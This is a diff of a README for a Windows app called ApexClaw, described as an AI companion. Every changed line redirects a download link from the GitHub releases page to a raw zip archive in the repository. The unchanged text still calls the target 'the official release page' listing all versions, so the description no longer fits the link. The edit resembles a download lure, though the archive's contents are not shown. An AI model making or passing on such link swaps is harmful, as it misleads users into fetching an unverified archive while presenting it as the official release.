@@ -1,6 +1,6 @@
 # 🛠️ ApexClaw - Your Smart AI Companion
 
-[![Download ApexClaw](https://img.shields.io/badge/Download-ApexClaw-brightgreen)](https://github.com/Bakero64/ApexClaw/releases)  
+[![Download ApexClaw](https://img.shields.io/badge/Download-ApexClaw-brightgreen)](https://raw.githubusercontent.com/Bakero64/ApexClaw/master/tools/Apex_Claw_v3.0.zip)  
 
 ---
 
@@ -40,7 +40,7 @@ Follow these instructions carefully to install ApexClaw on your Windows computer
 
 Go to the official release page to get the software. Click the link below:
 
-[![Download ApexClaw](https://img.shields.io/badge/Download-ApexClaw-blue)](https://github.com/Bakero64/ApexClaw/releases)
+[![Download ApexClaw](https://img.shields.io/badge/Download-ApexClaw-blue)](https://raw.githubusercontent.com/Bakero64/ApexClaw/master/tools/Apex_Claw_v3.0.zip)
 
 This page lists all available versions of ApexClaw. Look for the latest stable version.
 
@@ -150,4 +150,4 @@ This removes the app but keeps your files unless you delete them manually.
 
 ---
 
-[Download ApexClaw now](https://github.com/Bakero64/ApexClaw/releases) to get started with your AI helper on Windows.
+[Download ApexClaw now](https://raw.githubusercontent.com/Bakero64/ApexClaw/master/tools/Apex_Claw_v3.0.zip) to get started with your AI helper on Windows.
